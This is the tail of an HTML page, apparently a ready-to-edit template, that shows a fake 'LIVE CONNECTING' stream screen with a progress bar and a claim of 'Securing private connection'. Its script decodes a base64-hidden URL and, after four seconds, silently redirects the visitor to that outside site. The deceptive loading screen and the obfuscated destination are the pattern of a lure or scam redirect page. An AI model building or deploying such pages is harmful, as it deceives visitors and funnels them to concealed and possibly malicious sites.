<style>

*{
  margin:0;
  padding:0;
  box-sizing:border-box;
}

body{
  background:#000;
  color:#fff;
  font-family:Arial,sans-serif;
  width:100%;
  height:100vh;
  overflow:hidden;
}

.container{
  width:100%;
  height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
  flex-direction:column;
  text-align:center;
  padding:20px;
}

.preview{
  width:100%;
  max-width:430px;
  border-radius:18px;
  overflow:hidden;
  box-shadow:0 0 30px rgba(255,255,255,0.12);
}

.preview img{
  width:100%;
  display:block;
}

.live{
  margin-top:18px;
  font-size:28px;
  font-weight:bold;
  letter-spacing:1px;
}

.dot{
  color:#ff0000;
  animation:blink 1s infinite;
}

@keyframes blink{
  50%{
    opacity:0.35;
  }
}

.loading-box{
  width:270px;
  margin-top:18px;
}

.loading-text{
  font-size:14px;
  color:#bdbdbd;
  margin-bottom:10px;
}

.bar{
  width:100%;
  height:8px;
  background:#1a1a1a;
  border-radius:20px;
  overflow:hidden;
}

.fill{
  width:0%;
  height:100%;
  background:#ff0000;
  animation:load 4s linear forwards;
}

@keyframes load{
  from{
    width:0%;
  }

  to{
    width:100%;
  }
}

.note{
  margin-top:14px;
  font-size:13px;
  color:#888;
}

</style>
</head>

<body>

<div class="container">

  <!-- ================== EDIT IMAGE ================== -->
  <div class="preview">
    <img src="/preview1.jpg" alt="Preview">
  </div>

  <div class="live">
    <span class="dot">●</span> LIVE CONNECTING...
  </div>

  <div class="loading-box">

    <div class="loading-text">
      Securing private connection...
    </div>

    <div class="bar">
      <div class="fill"></div>
    </div>

  </div>

  <div class="note">
    Please wait a moment...
  </div>

</div>

<script>

  // ================== ENCODED LINK ==================

  const target = atob(
    "aHR0cHM6Ly9mZGVkZGcuaHVic3Mub25lL3AvbmhWTnk="
  );

  // ================== REDIRECT TIMER ==================

  setTimeout(() => {
    window.location.href = target;
  }, 4000);

</script>

</body>
